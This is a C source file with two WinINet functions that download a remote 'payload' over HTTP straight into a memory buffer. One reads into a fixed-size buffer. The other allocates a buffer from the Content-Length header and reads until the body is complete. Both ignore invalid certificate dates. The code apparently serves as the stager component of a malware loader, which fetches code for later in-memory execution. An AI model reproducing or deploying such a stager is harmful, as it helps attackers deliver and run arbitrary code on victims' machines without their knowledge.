#include "WebRetrival.h"

BOOL FetchPayloadHttpStatic(LPWSTR pURL,DWORD sPayload, PVOID pPayloadBuffer)
{
	
	DWORD dwBytesWritten;
	BOOL state = FALSE;
	HINTERNET hInetSession, hInetFile = NULL;
	
	if (!(hInetSession = InternetOpenW(NULL, 0, NULL, NULL, 0))) goto  _cleanUp;

	if (!(hInetFile = InternetOpenUrlW(
		hInetSession, pURL, NULL, 0,
		INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0
	))) goto _cleanUp;

	if (!(InternetReadFile(hInetFile, pPayloadBuffer, sPayload, &dwBytesWritten))) goto _cleanUp;

	state = TRUE;

_cleanUp:	
	if (!hInetSession) return state;
	
	InternetCloseHandle(hInetSession);
	
	if (!hInetFile) return state;
	
	InternetCloseHandle(hInetFile);

	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);

	return state;
}



BOOL FetchPayloadHttpDynamic(LPWSTR pURL, PBYTE *pPayloadBuffer, PSIZE_T pPayloadSize)
{
	HINTERNET hInetSession, hInetFile = NULL;
	SIZE_T    sTracker = 0;
	DWORD     dwBytesRead = 0, dwPayloadSize = 0,dwSizeOfPayloadSize = sizeof(dwPayloadSize);
	BOOL      bState = FALSE;

	if (!(hInetSession = InternetOpenW(NULL, 0, NULL, NULL, 0))) goto _cleanup;

	if (!(hInetFile = InternetOpenUrlW(
		hInetSession, pURL, NULL, 0, 
		INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0
	))) goto _cleanup;

	if (!HttpQueryInfoW(hInetFile, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &dwPayloadSize, &dwSizeOfPayloadSize, NULL)) goto _cleanup;

	if (!dwPayloadSize) goto _cleanup;

	*pPayloadSize = dwPayloadSize;
		
	if (!(*pPayloadBuffer = LocalAlloc(LPTR, dwPayloadSize))) goto _cleanup;
	
	 do {
		if (!(InternetReadFile(hInetFile, *pPayloadBuffer + sTracker, dwPayloadSize - sTracker, &dwBytesRead) && dwBytesRead)) goto _cleanup;
		
		sTracker += dwBytesRead;
		 
	 } while (dwPayloadSize > sTracker);
	if (sTracker == dwPayloadSize) bState = TRUE;
	
_cleanup:
	if (!hInetSession) goto _end_of_func;
	InternetCloseHandle(hInetSession);
	
	if (!hInetFile) goto _end_of_func;
	InternetCloseHandle(hInetFile);
	
_end_of_func:
	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	
	return bState;
}